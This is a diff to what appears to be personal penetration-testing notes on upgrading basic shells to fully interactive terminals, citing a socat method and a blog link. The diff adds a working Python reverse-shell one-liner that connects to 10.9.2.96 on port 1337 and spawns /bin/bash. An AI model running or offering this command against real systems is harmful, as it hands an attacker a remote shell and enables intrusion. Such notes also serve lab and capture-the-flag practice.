@@ -24,7 +24,9 @@ export TERM=xterm
 To fool commands like `su username`when you need a proper terminal to execute them. 
 ## Method 3 : socat
 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+
+python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.96",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTQ2MTc0NDA2LDE5MzgyMTE4NDYsLTE0Mj
-UxNDA5NywxOTEzNTkyMTkxXX0=
+eyJoaXN0b3J5IjpbMjM1MjQ1MjMyLDE0NjE3NDQwNiwxOTM4Mj
+ExODQ2LC0xNDI1MTQwOTcsMTkxMzU5MjE5MV19
 -->
